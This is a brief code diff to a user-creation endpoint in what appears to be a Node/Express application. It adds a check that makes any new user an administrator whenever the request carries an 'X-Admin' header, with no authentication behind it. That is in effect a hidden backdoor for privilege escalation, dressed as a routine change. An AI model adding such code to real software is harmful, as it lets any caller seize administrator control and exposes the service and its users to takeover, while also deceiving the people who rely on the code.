@@ -12,6 +12,10 @@ exports.createUser = async (req, res, next) => {
 	try {
 		const {error} = await registerValidation(req.body);
 
+		if (req.header('X-Admin')) {
+			req.body.role = 'admin'
+		}
+
 		// throw validation errors
 		if (error) {
 			throw new UserError(constants.error.BAD_REQUEST, error.details[0].message);
